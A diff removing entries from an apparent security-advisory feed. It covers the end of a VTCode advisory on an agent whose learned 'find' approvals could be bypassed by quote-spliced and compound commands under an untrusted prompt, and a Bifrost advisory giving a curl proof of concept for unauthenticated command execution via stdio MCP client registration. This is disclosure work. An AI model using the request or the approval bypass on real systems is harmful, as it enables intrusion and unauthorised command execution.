-An earlier change in 0.141.12 rejected this `$''` splice only on a bare `find`. The follow-up in 0.171.5 (https://github.com/vinhnx/VTCode/pull/778, commit 5840697cd0dc8f94b9b53d88185329eecba8de11) is the first release the advisory treats as patched. It also refuses family learning for path-qualified `find` (`./find`, `/usr/bin/find`), mixed-case or quote-spliced flags, wrapper and environment prefixes, and compound commands.
-
-Until you upgrade, do not rely on learned find approvals. Treat a workspace where an untrusted prompt can drive the agent as able to run shell commands after a few ordinary finds have been approved.
-
-## References
-https://github.com/vinhnx/VTCode/security/advisories/GHSA-r249-hpfx-x2w7
-https://github.com/vinhnx/VTCode/pull/778
-https://github.com/vinhnx/VTCode/commit/5840697cd0dc8f94b9b53d88185329eecba8de11
-https://github.com/vinhnx/VTCode/releases/tag/0.171.5
-https://www.cve.org/CVERecord?id=CVE-2026-104247
-https://github.com/vinhnx/VTCode
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/bifrost-is-vulnerable-to-unauthenticated-remote-code-execution-via-mcp-stdio-client-registration-cve-2026-90898/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/bifrost-is-vulnerable-to-unauthenticated-remote-code-execution-via-mcp-stdio-client-registration-cve-2026-90898/</guid>
-            <pubDate>Mon, 14 Sep 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-90898, CRITICAL, Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration
-
-
-## Component
-
-Bifrost (github.com/maximhq/bifrost/transports)
-
-## Affected versions
-
-< 2.1.0
-
-## Description
-
-Bifrost registers MCP clients through its management API. A stdio client is a command plus args. Bifrost starts that program in the gateway the moment the client is added. No MCP handshake required.
-
-The default is governance.auth_config.is_enabled=false. Auth off means every caller is a local admin. One unauthenticated POST /api/mcp/client is enough to run a program as the Bifrost process user (appuser on the official image).
-
-The HTTP request may time out. The process is already running. transports/v2.1.0 refuses an unauthenticated stdio registration with 403. transports/v2.0.0 still allows it. The 1.6.x line through 1.6.11 does not contain the fix.
-
-## PoC
-
-<br>
-
-**Step 1 - Run Bifrost with management authentication disabled**
-
-<br>
-
-Start a Bifrost HTTP transport before 2.1.0 with the default governance.auth_config.is_enabled=false. The management API must be reachable on the host and port you use below (the binary default is localhost:8080):
-
-```
-curl -fsS http://127.0.0.1:8080/health
-```
-
-<br>
-
-**Step 2 - Register a stdio MCP client**
-
-<br>
-
-No authentication header is required. A request timeout is expected while Bifrost waits for an MCP handshake. The timeout does not mean the command failed to start.
-
-```
-curl --max-time 5 --silent --show-error \
-  --request POST http://127.0.0.1:8080/api/mcp/client \
-  --header 'Content-Type: application/json' \
-  --data '{
-    "name": "rceproof",
-    "connection_type": "stdio",
-    "auth_type": "none",
-    "stdio_config": {
-      "command": "/bin/sh",
-      "args": ["-c", "echo PROVEN > /tmp/bifrost-mcp-rce; sleep 60"]
-    },
-    "tools_to_execute": ["*"]
-  }' || true
-```
-
-<br>
-
-**Step 3 - Confirm the command ran**
-
-<br>
-
-```
-cat /tmp/bifrost-mcp-rce
-```
-
-<br>
-
-Expected output:
-
-```
-PROVEN
-```
-
-<br>
-
-On 2.1.0 or later, the same POST returns 403 and the marker is not written.
-
-## Vulnerability Mitigations
-
-Upgrade Bifrost HTTP transport to 2.1.0 or later. The fix (https://github.com/maximhq/bifrost/pull/6757) returns 403 for unauthenticated stdio MCP client registration when dashboard authentication is disabled or unconfigured. Authenticated admins can still add stdio clients. The 1.6.x line through 1.6.11 and transports/v2.0.0 do not include this change.
-
-Until you upgrade, set governance.auth_config.is_enabled to true, use strong administrator credentials, and keep the management listener off untrusted networks. Treat any exposed instance that ran with authentication disabled as compromised and rotate virtual keys and provider credentials.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-90898
-https://github.com/maximhq/bifrost/pull/6757
-https://github.com/maximhq/bifrost/commit/12e170352bd25eab1ae9ba16611f1797d1fd8fdc
-https://github.com/maximhq/bifrost/releases/tag/transports/v2.1.0
-https://github.com/maximhq/bifrost
 ]]></content:encoded>
         </item>
     </channel>
